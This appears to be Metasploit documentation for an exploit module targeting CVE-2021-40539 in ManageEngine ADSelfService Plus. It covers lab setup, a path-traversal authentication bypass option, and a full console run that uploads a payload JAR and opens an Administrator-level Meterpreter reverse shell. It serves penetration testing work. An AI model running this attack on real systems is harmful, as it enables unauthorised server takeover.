## Vulnerable Application

### Setup

Follow the [Getting Started] guide. You do not need AD, and you can skip licensing.

1. Download [ManageEngine_ADSelfService_Plus_64bit.exe]
1. Run the installer
1. Start the server
1. Hax

[Getting Started]: https://www.manageengine.com/products/self-service-password/help/admin-guide/gettingstarted/getting-started.html
[ManageEngine_ADSelfService_Plus_64bit.exe]: https://archives2.manageengine.com/self-service-password/6113/ManageEngine_ADSelfService_Plus_64bit.exe

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

### TARGETURI

Path traversal for auth bypass. `/./` is the default.

## Scenarios

### ADSelfService Plus 6113 on Windows Server 2016

```
msf6 > use exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539
[*] Using configured payload java/meterpreter/reverse_https
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2021_40539) > options

Module options (exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8888             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /./              yes       Path traversal for auth bypass
   VHOST                       no        HTTP server virtual host


Payload options (java/meterpreter/reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Java Dropper


msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2021_40539) > set rhosts 172.16.57.10
rhosts => 172.16.57.10
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2021_40539) > set lhost 172.16.57.1
lhost => 172.16.57.1
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2021_40539) > run

[*] Started HTTPS reverse handler on https://172.16.57.1:8443
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully bypassed REST API authentication.
[*] Uploading payload JAR: P2dP5Ric88T.jar
[+] Successfully uploaded payload JAR
[*] Executing payload JAR
[*] https://172.16.57.1:8443 handling request from 172.16.57.10; (UUID: tyuzturs) Staging java payload (58615 bytes) ...
[+] Successfully executed payload JAR
[+] Deleted P2dP5Ric88T.jar
[*] Meterpreter session 1 opened (172.16.57.1:8443 -> 127.0.0.1 ) at 2021-11-15 18:08:25 -0600

meterpreter > getuid
Server username: Administrator
meterpreter > sysinfo
Computer    : WIN-9MFFR3JM534
OS          : Windows Server 2016 10.0 (amd64)
Meterpreter : java/windows
meterpreter >
```
